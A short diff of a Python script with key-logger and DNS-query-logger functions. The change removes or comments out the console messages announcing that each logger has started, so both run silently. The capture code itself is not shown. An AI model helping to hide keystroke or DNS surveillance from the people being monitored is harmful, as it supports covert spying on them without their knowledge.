@@ -26,7 +26,6 @@ def setup_logger(log_filename, logger_name):
     return logger
 
 def key_logger():
-    log_console("Key Logger started and running...", "INFO")
     log_filename = get_daily_log_filename("keylog")
     logger = setup_logger(log_filename, "KeyLogger")
 
@@ -45,7 +44,7 @@ def key_logger():
         sys.exit(1)
 
 def dns_logger():
-    log_console("DNS Query Logger started and running...", "INFO")
+    # log_console("DNS Query Logger started and running...", "INFO")
     log_filename = get_daily_log_filename("dnslog")
     logger = setup_logger(log_filename, "DNSLogger")
 
